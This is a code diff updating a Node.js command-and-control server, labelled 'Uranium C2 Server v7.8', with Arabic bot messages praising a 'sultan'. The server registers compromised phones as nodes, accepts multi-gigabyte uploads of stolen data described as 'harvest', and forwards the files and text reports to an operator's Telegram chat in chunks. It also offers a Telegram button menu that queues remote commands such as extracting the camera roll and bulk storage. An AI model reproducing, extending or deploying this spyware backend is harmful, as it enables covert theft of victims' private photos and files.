@@ -1,4 +1,7 @@
-// server_uranium_v7_7_controller.js - Uranium Fist Controlling Server Core v7.7
+// =========================================================================
+// ⚡ مملكة ناصر دين الله الكلعي ⚡ - Uranium Fist Controlling Server v7.8
+// السلطان: ناصر دين الله الكلعي 💀 | السيادة الرقمية المطلقة
+// =========================================================================
 require('dotenv').config();
 const express = require('express');
 const telegramBot = require('node-telegram-bot-api');
@@ -10,14 +13,14 @@ const token = process.env.TG_TOKEN;
 const chatId = process.env.TG_ID;
 
 if (!token || !chatId) {
-    console.error('[-] Critical Error: Telegram credentials missing.');
+    console.error('[-] Critical Error: Telegram credentials missing in environment.');
     process.exit(1);
 }
 
 const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
 if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });
 
-const db = new sqlite3.Database('./uranium_core_v7_7.db');
+const db = new sqlite3.Database('./uranium_core_v7_8.db');
 db.serialize(() => {
     db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
     db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
@@ -32,8 +35,8 @@ appBot.on('polling_error', (error) => {
     }
 });
 
-app.use(express.text({ type: 'application/json', limit: '2048mb' }));
-app.use(express.raw({ type: 'application/octet-stream', limit: '12000mb' }));
+app.use(express.text({ type: 'application/json', limit: '4096mb' }));
+app.use(express.raw({ type: 'application/octet-stream', limit: '15000mb' }));
 
 async function sendTg(msg, options = {}) {
     try {
@@ -44,18 +47,19 @@ async function sendTg(msg, options = {}) {
 }
 
 async function sendTgDocumentSmart(filePath, caption) {
+    if (!fs.existsSync(filePath)) return;
     const stats = fs.statSync(filePath);
     const fileSizeMB = stats.size / (1024 * 1024);
     const CHUNK_LIMIT = 45 * 1024 * 1024; // 45MB حد تيليجرام الآمن
 
     if (stats.size <= CHUNK_LIMIT) {
         try {
-            await appBot.sendDocument(chatId, filePath, { caption: `${caption}\n⚔️ [إشراف السلطان ناصر دين الله الكلعي]` });
+            await appBot.sendDocument(chatId, filePath, { caption: `${caption}\n⚔️ [تنفيذ وإشراف السلطان ناصر دين الله الكلعي]` });
         } catch (e) {
             await sendTg(`⚠️ فشل إرسال الملف مباشرة، تم حفظه محلياً في <code>uranium_storage/${path.basename(filePath)}</code> (${fileSizeMB.toFixed(2)} MB).`);
         }
     } else {
-        await sendTg(`📦 الملف <b>${path.basename(filePath)}</b> ضخم جداً (${fileSizeMB.toFixed(2)} MB). جاري تقسيمه وإرساله أجزاء بأمر السلطان...`);
+        await sendTg(`📦 الملف <b>${path.basename(filePath)}</b> ضخم جداً (${fileSizeMB.toFixed(2)} MB). جاري تقسيمه وإرساله أجزاء متسلسلة بأمر السلطان...`);
         const fd = fs.openSync(filePath, 'r');
         const buffer = Buffer.allocate(CHUNK_LIMIT);
         let partNum = 1;
@@ -65,7 +69,7 @@ async function sendTgDocumentSmart(filePath, caption) {
             const partPath = `${filePath}.part${String(partNum).padStart(3, '0')}`;
             fs.writeFileSync(partPath, buffer.slice(0, bytesRead));
             try {
-                await appBot.sendDocument(chatId, partPath, { caption: `${caption} - الجزء (${partNum})\n⚔️ [السلطان ناصر دين الله الكلعي]` });
+                await appBot.sendDocument(chatId, partPath, { caption: `${caption} - الجزء (${partNum})\n⚔️ [مملكة ناصر دين الله الكلعي]` });
             } catch (err) {
                 await sendTg(`⚠️ فشل إرسال الجزء ${partNum}`);
             }
@@ -77,7 +81,7 @@ async function sendTgDocumentSmart(filePath, caption) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM CONTROLLING SERVER v7.7 ONLINE (السلطان ناصر دين الله الكلعي) [☢️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM C2 SERVER v7.8 ONLINE (السلطان ناصر دين الله الكلعي) [☢️]</h1></body></html>`);
 });
 
 app.post('/api/v3/uranium/upload_raw', async (req, res) => {
@@ -102,7 +106,6 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
         console.log(`[+] SUCCESS: File securely saved -> ${controllerFilePath} (${fileSizeMB.toFixed(2)} MB)`);
         await sendTg(`☢️ <b>حصاد جديد تم حفظه في خزينتك المركزية:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);
 
-        // إرسال ذكي لتيليجرام مع التقسيم التلقائي
         await sendTgDocumentSmart(controllerFilePath, `☠️ أرشيف الحصاد: <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)`);
 
         res.status(200).json({ status: 'OK', message: 'SAVED_AND_FORWARDED' });
@@ -131,7 +134,7 @@ app.post('/api/v3/uranium/stream', async (req, res) => {
         if (payload.type === 'TEXT_REPORT') {
             const textData = payload.data || '';
             if (textData.length > 5) {
-                await sendTg(`☢️ <b>تقرير العقدة [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3800)}</pre>`);
+                await sendTg(`☢️️ <b>تقرير العقدة [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3800)}</pre>`);
             }
         }
 
@@ -163,7 +166,7 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`👑 <b>مملكة السلطان ناصر دين الله الكلعي - غرفة القيادة v7.7:</b>\nاختر العقدة للسيطرة التامة:`, {
+            await sendTg(`👑 <b>مملكة السلطان ناصر دين الله الكلعي - غرفة القيادة v7.8:</b>\nاختر العقدة للسيطرة التامة:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -179,7 +182,7 @@ appBot.on('callback_query', async (query) => {
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '☢️️ حصاد الكاميرا الشامل (DCIM)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
+                    { text: '☢️ حصاد الكاميرا الشامل (DCIM)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
                     { text: '📥 التخزين الضخم Download (12GB+)', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
                 ],
                 [
@@ -217,7 +220,7 @@ appBot.on('callback_query', async (query) => {
         const action = parts.slice(1).join('_');
 
         db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
-            await appBot.answerCallbackQuery(query.id, { text: `☢️️ تم إطلاق الأمر [${action}] بأمر السلطان!` });
+            await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق الأمر [${action}] بأمر السلطان!` });
             await sendTg(`⚡ <b>أمر سيطرة [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
@@ -227,4 +230,4 @@ appBot.on('callback_query', async (query) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`[+] Uranium Controlling Server Online on port ${PORT} (ناصر دين الله الكلعي)`));
+app.listen(PORT, () => console.log(`[+] Uranium C2 Server v7.8 Online on port ${PORT} (ناصر دين الله الكلعي)`));
